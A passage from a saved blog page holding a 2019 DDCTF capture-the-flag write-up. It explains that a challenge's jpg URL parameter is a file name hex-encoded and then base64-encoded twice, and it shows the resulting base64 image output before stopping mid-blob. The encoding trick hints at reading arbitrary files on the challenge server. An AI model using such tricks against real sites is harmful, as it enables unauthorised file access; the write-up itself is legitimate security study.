@@ -1,0 +1,495 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  <title>didictf writeup | chuddy&#39;s Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+    <meta name="keywords" content="chuddy's Blog">
+  
+  <meta name="description" content="2019DDCTF writeupweb滴~打开题目  发现url中的jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09有一点不正常，像是base64加密得到的，尝试发现是flag.jpg先进行base16加密在进行两次base64加密得到的 页面的源代码中是对flag.jpg进行base64加密后输出的1&amp;lt;title&amp;gt;TmpZMlF6WXhOamN5UlRaQk">
+<meta name="keywords" content="writeup">
+<meta property="og:type" content="article">
+<meta property="og:title" content="didictf writeup">
+<meta property="og:url" content="http://yoursite.com/2019/04/22/didictf-writeup/index.html">
+<meta property="og:site_name" content="chuddy&#39;s Blog">
+<meta property="og:description" content="2019DDCTF writeupweb滴~打开题目  发现url中的jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09有一点不正常，像是base64加密得到的，尝试发现是flag.jpg先进行base16加密在进行两次base64加密得到的 页面的源代码中是对flag.jpg进行base64加密后输出的1&amp;lt;title&amp;gt;TmpZMlF6WXhOamN5UlRaQk">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/18/ES2IXQ.md.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/19/EpNRde.md.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/19/EpNHL8.md.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/19/Epaphd.md.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/19/Ep4Spt.md.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/19/EposN4.md.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/19/EpocC9.md.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/19/EpTSUg.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/19/Ep73Wj.md.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/19/EpzXMF.md.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/15/Aj7sUA.md.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/19/E9p2ng.md.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/19/E998Ej.md.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/19/E9COYR.md.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/19/E9FQWn.md.png">
+<meta property="og:updated_time" content="2019-04-22T08:25:56.282Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="didictf writeup">
+<meta name="twitter:description" content="2019DDCTF writeupweb滴~打开题目  发现url中的jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09有一点不正常，像是base64加密得到的，尝试发现是flag.jpg先进行base16加密在进行两次base64加密得到的 页面的源代码中是对flag.jpg进行base64加密后输出的1&amp;lt;title&amp;gt;TmpZMlF6WXhOamN5UlRaQk">
+<meta name="twitter:image" content="https://s2.ax1x.com/2019/04/18/ES2IXQ.md.png">
+  
+  
+    <link rel="icon" href="/favicon.ico">
+  
+  <link href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+  <link rel="stylesheet" href="/css/style.css">
+  <script src="/js/pace.min.js"></script>
+  
+
+  
+  
+
+</head>
+</html>
+<body>
+  <div id="container">
+      <header id="header">
+    <div id="banner"></div>
+    <div id="header-outer">
+        <div id="header-menu" class="header-menu-pos animated">
+            <div class="header-menu-container">
+                <a href="/" class="left">
+                    <span class="site-title">一个专注 WEB 安全的技术博客</span>
+                </a>
+                <nav id="header-menu-nav" class="right">
+                    
+                    <a href="/">
+                        <i class="fa fa-home"></i>
+                        <span>Home</span>
+                    </a>
+                    
+                    <a href="/archives">
+                        <i class="fa fa-archive"></i>
+                        <span>Archives</span>
+                    </a>
+                    
+                    <a href="/about">
+                        <i class="fa fa-user"></i>
+                        <span>About</span>
+                    </a>
+                    
+                </nav>
+                <a class="mobile-header-menu-button">
+                    <i class="fa fa-bars"></i>
+                </a>
+            </div>
+        </div>
+        <div id="header-row">
+            <div id="logo">
+                <a href="/">
+                    <img src="/images/logo.png" alt="logo">
+                </a>
+            </div>
+            <div class="header-info">
+                <div id="header-title">
+                    
+                    <h2>
+                        一个专注 WEB 安全的技术博客
+                    </h2>
+                    
+                </div>
+                <div id="header-description">
+                    
+                </div>
+            </div>
+            <nav class="header-nav">
+                <div class="social">
+                    
+                        <a title="chuddy" target="_blank" href="//chuddyli.github.io">
+                            <i class="fa fa-home fa-2x"></i></a>
+                    
+                        <a title="Github" target="_blank" href="//github.com/chuddyli">
+                            <i class="fa fa-github fa-2x"></i></a>
+                    
+                </div>
+            </nav>
+        </div>
+    </div>
+</header>
+      <div class="outer">
+        <section id="main" class="body-wrap"><article id="post-didictf-writeup" class="article article-type-post" itemscope="" itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="post-title" itemprop="name">
+      didictf writeup
+    </h1>
+    <div class="post-title-bar">
+      <ul>
+          
+        <li>
+          <i class="fa fa-calendar"></i>  2019-04-22
+        </li>
+        <li>
+          <i class="fa fa-eye"></i>
+          <span id="busuanzi_value_page_pv"></span>
+        </li>
+      </ul>
+    </div>
+  
+
+          
+      </header>
+    
+    <div class="article-entry post-content" itemprop="articleBody">
+      
+            
+            <h1 id="2019DDCTF-writeup"><a href="#2019DDCTF-writeup" class="headerlink" title="2019DDCTF writeup"></a>2019DDCTF writeup</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="滴"><a href="#滴" class="headerlink" title="滴~"></a>滴~</h3><p>打开题目</p>
+<p><a href="https://imgchr.com/i/ES2IXQ" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/04/18/ES2IXQ.md.png" alt="ES2IXQ.md.png"></a></p>
+<p>发现url中的<code>jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09</code>有一点不正常，像是base64加密得到的，尝试发现是<code>flag.jpg</code>先进行<code>base16加密</code>在进行两次<code>base64加密</code>得到的</p>
+<p>页面的源代码中是对flag.jpg进行base64加密后输出的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;title&gt;TmpZMlF6WXhOamN5UlRaQk56QTJOdz09&lt;/title&gt;flag.jpg&lt;/br&gt;flag.jpg&lt;/br&gt;&lt;img src=&apos;data:image/gif;base64,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